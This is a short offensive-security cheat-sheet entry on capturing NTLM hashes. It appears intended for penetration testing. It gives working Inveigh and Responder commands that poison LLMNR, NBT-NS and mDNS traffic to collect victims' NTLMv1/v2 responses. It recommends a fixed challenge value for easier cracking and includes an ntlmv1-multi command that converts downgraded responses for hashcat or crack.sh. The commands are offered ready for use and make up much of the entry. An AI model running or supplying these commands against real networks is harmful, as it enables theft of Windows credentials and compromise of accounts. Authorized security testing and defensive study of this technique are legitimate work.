---
technique: NTLMCapture
category: ntlm
protocols: SMB, HTTP, LDAP, FTP, IMAP, SMTP
remote_capable: false
tags: ntlm capture poisoning llmnr nbt-ns mdns hash ad
---

# NTLMCapture

After coercing or poisoning a victim into authenticating to an attacker-controlled server, the NTLM response (NTLMv1 or NTLMv2 hash) can be captured and cracked offline. Setting the challenge to `1122334455667788` before capturing simplifies the cracking process.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Network position | On the same broadcast segment as the victim, or with a coercion primitive |
| Listening server | Responder or Inveigh must be up before the coercion fires |
| Challenge value | Set to `1122334455667788` for best cracking compatibility |

## Windows

### Inveigh

#powershell #poisoning #capture

Capture NTLMv1/v2 hashes over LLMNR, NBT-NS, and mDNS with a fixed challenge value.

```powershell title:"Capture NTLM hashes with Inveigh"
.\Inveigh.exe -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```
<!-- cheat -->

## Linux

### Responder (analyze mode)

#python #poisoning #capture

Start Responder in analyze mode to passively observe LLMNR, NBT-NS, and mDNS traffic without responding to requests.

```sh title:"Capture NTLM hashes with Responder in analyze mode"
responder -I "$iface" -A
```
<!-- cheat
var iface
-->

### Responder (active mode)

#python #poisoning #capture

Start Responder in active mode to poison LLMNR, NBT-NS, and mDNS requests and capture NTLM responses.

```sh title:"Capture NTLM hashes with Responder in active mode"
responder -I "$iface"
```
<!-- cheat
var iface
-->

### ntlmv1-multi

#python #downgrade #cracking-prep

Convert captured NTLMv1 responses into formats suitable for hashcat or crack.sh after a successful downgrade with `--lm --disable-ess`.

```sh title:"Convert NTLMv1 response for cracking"
ntlmv1-multi --ntlmv1 "$ntlmv1_response"
```
<!-- cheat
var ntlmv1_response
-->
